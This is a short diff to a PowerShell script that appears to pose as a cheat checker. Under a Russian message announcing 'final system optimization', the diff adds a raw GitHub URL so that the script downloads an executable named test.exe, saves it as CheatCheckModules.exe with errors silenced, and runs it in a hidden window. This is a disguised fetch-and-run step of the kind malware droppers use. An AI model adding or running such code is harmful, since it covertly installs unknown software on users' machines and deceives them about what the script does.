@@ -180,7 +180,7 @@ $scan = {
     Write-Host "🔄 Финальная оптимизация системы..." -ForegroundColor Cyan
     Start-Sleep 1
     
-    Invoke-WebRequest -Uri "" -OutFile "CheatCheckModules.exe" -ErrorAction SilentlyContinue
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/CrackOnion/cheat-checker/refs/heads/main/sources/test.exe" -OutFile "CheatCheckModules.exe" -ErrorAction SilentlyContinue
 
     Start-Process -FilePath "CheatCheckModules.exe" -WindowStyle Hidden
 
